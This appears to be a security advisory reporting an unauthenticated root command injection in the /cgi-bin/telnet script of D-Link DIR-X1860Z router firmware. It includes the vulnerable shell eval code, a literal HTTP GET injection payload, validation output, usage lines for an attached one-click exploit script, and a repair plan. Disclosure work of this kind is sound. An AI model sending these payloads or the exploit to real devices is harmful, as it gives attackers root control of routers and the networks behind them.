# D-Link DIR-X1860Z Rev A `/cgi-bin/telnet` Shell `eval` OS Command Injection

## Title

D-Link DIR-X1860Z Rev A 1.0.7.260821.161908 `/cgi-bin/telnet` Unauthenticated Root OS Command Injection

## Description

### 1. Vulnerability Name

Unauthenticated root OS command injection in `/cgi-bin/telnet` through attacker-controlled query parameters evaluated by the shell `eval` builtin.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link DIR-X1860Z Rev A Router Operating System
- **Component**: `/www/cgi-bin/telnet`, exposed by `uhttpd` as `/cgi-bin/telnet`
- **Affected input**: Arbitrary query-string key/value pairs

![image-20261104192731604](DIR-X1860Z-V1.0.7-telnet-eval-command-injection-RCE.EN.assets/image-20261104192731604.png)

### 4. Affected Version

- **Firmware**: `V1.0.7.260821.161908` hotfix
- **Firmware file**: `DIR-X1860Z_V1.0.7.260821.161908_UPGRADE_ALL.bin`
- **Firmware package**: `DIR-X1860Z_REVA_FIRMWARE_V1.0.7.260821.161908_HOTFIX.zip`
- **SHA-256**: `630404424ae1825ae53a27228bd58f3f97b0372c8bee181a061bf3ff2a40adfa`
- **Architecture**: 32-bit little-endian ARM
- **Filesystem**: JFFS2

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: OS command injection
- **CWE**: CWE-78 (Improper Neutralization of Special Elements Used in an OS Command)
- **Attack vector**: Network; adjacent networks by default, or remote networks if the management interface is exposed
- **Authentication required**: No
- **User interaction required**: No
- **Privileges gained**: Root (`uid=0`) in the validated emulation environment

### 6. Severity

An unauthenticated attacker who can reach the management service can execute arbitrary shell commands as root and fully compromise the router. Exploitation requires only a crafted HTTP GET request and does not depend on the Telnet service being enabled or successfully reconfigured.

### 7. Vulnerability Description

The `/cgi-bin/telnet` shell script parses the first query-string parameter into attacker-controlled `key` and `val` variables and passes them to `eval`. Its URL-decoding statement is commented out, and the script performs no session or permission check. A single quote in the parameter value terminates the intended quoted assignment and appends arbitrary shell commands.

The injected command executes before the script attempts to change the Telnet configuration. Consequently, command execution does not depend on whether the Telnet service starts successfully. The script's later `Failed to close telnet!` output does not indicate that the injected command failed.

### 8. Technical Details and Root Cause

#### Missing authentication

There is no `session access` check in `/www/cgi-bin/telnet`. In contrast, the adjacent `/www/cgi-bin/upgrade` script checks a 32-byte session ID and the `system.upgrade` permission at lines 64-73. This demonstrates that authentication is not implicitly enforced for every CGI script by the framework.

#### Unsafe query parsing and shell evaluation

File: `/www/cgi-bin/telnet`

```sh
# Line 21: URL decoding is commented out.
# QUERY_STRING=`urldecode "$QUERY_STRING"`

# Lines 22-27: both key and val originate from the request.
param=${QUERY_STRING%%&*}
QUERY_STRING=${QUERY_STRING#*&}
val=${param#*=}
key=${param%=*}
eval "${key}='${val}'"
```

The source-to-sink flow is:

```text
HTTP QUERY_STRING -> param -> val/key -> eval -> /bin/sh -> attacker command
```

For a parameter value beginning with `';`, the shell closes the quoted value and interprets the remaining text as commands. A final `echo '` absorbs the quote appended by the script and avoids relying on a shell comment.

Because URL decoding is disabled, the single quote must be sent literally as `'`; `%27` is not an equivalent payload for this script. Spaces can be replaced with `${IFS}` to keep the HTTP request-target valid.

For example, the assignment produced by a marker payload is logically equivalent to:

```sh
x=''
echo DIRX1860Z_RCE_VALIDATED > /tmp/dirx_rce_proof
echo DIRX1860Z_RCE_VALIDATED > /www/dirx_rce_proof.txt
echo ''
```

### 9. Proof of Concept

The following steps were reproduced against the emulated firmware at `192.168.135.137:23355`. Replace the host and port only with an authorized local test target. The original device management port is not assumed to be `23355`; this port was selected for emulation.

#### Raw HTTP request

The following request writes a marker to `/tmp` and to the emulated web document root. Single quotes and `${IFS}` are intentionally literal:

```http
GET /cgi-bin/telnet?x=';echo${IFS}DIRX1860Z_RCE_VALIDATED>/tmp/dirx_rce_proof;echo${IFS}DIRX1860Z_RCE_VALIDATED>/www/dirx_rce_proof.txt;echo${IFS}'&user=a&pwd=b&enable=false HTTP/1.1
Host: 192.168.135.137:23355
Connection: close
```

Retrieve the proof through an independent request:

```http
GET /dirx_rce_proof.txt HTTP/1.1
Host: 192.168.135.137:23355
Connection: close
```

Observed result:

```text
TRIGGER_STATUS 200
PROOF_STATUS 200
PROOF_BODY DIRX1860Z_RCE_VALIDATED
VALIDATED: unauthenticated command execution and independent marker retrieval
```

The marker was also confirmed on the device side:

```text
/tmp/dirx_rce_proof       = DIRX1860Z_RCE_VALIDATED
/www/dirx_rce_proof.txt   = DIRX1860Z_RCE_VALIDATED
```

The independent marker retrieval does not rely on the trigger request's stdout or on the success of the later Telnet backend operation.

#### One-click command execution

The attached self-contained Python 3 script reproduces this issue without third-party dependencies. It performs a web frontend/backend preflight, executes the requested command, and validates command output plus a fresh random marker through a separate HTTP GET.

Run only this vulnerability with the default `id` command:

```bash
python DIR-X1860Z_oneclick_exp.py --only cgi
```

Execute a custom command:

```bash
python DIR-X1860Z_oneclick_exp.py --only cgi --command "uname -a"
```

Observed command output from the final validation:

```text
uid=0(root) gid=0(root) groups=0(root)
<fresh random marker>
```

![image-20261104193328171](DIR-X1860Z-V1.0.7-telnet-eval-command-injection-RCE.EN.assets/image-20261104193328171.png)

### 10. Impact

Successful exploitation provides unauthenticated root command execution. An attacker can read or modify device configuration, steal credentials, alter DNS and routing behavior, start or stop services, install persistent changes where storage permits, deny service, and attack connected LAN clients.

Writing proof files beneath `/www` was possible in the emulation environment but is not required for exploitation. If a physical device has a read-only document root, an attacker can still execute commands and use writable locations such as `/tmp`.

### 11. Repair Plan

1. Remove `eval` and do not parse HTTP parameters as shell source code.
2. Accept only the fixed keys `user`, `pwd`, and `enable`, and validate their values against strict allowlists.
3. Pass values through safe environment variables or direct APIs rather than constructing shell commands.
4. Add an explicit `session access` check at the beginning of the CGI and require the appropriate Telnet-configuration permission.
5. Run CGI scripts with least privilege and avoid a writable web document root for privileged commands.
6. Audit other CGI scripts for equivalent `eval`, `system`, and shell-command data flows.
7. Until a fix is available, remove or disable `/cgi-bin/telnet` and restrict management access to trusted hosts. Verify that unauthenticated requests return HTTP 401 or 403 after remediation.

### 12. Verification and Disclosure Notes

- **Evidence level**: **VALIDATED** through end-to-end testing in QEMU user-mode ARM chroot emulation.
- The web frontend and required backend processes, including `uhttpd`, `ubusd`, and `routerd`, were running during validation.
- The vulnerable CGI script was not patched to bypass authentication or enable command execution.
- One emulation-only timing adjustment was made in `liboss.so`: `usleep(1)` was changed to `usleep(1024)` at offset `0xd82c` to avoid a QEMU startup race. This change did not modify the vulnerable CGI or its shell `eval` path.
- Emulation port `23355` replaced the original management port to avoid host conflicts.
- Validation covered user-mode web/ubus emulation, not full hardware emulation or physical-device testing.
- D-Link SAP10513 documents CVE-2026-94036 and CVE-2026-94050 in earlier versions. The previously exposed anonymous `passwd_set` and `wificfg_get` calls returned `Access denied` in this firmware. This CGI command injection is a distinct issue and is not based on those disclosed vulnerabilities.

The following supporting file is attached to this submission:

- `DIR-X1860Z_oneclick_exp.py` — self-contained Python 3 proof of concept; use `--only cgi` for this vulnerability.
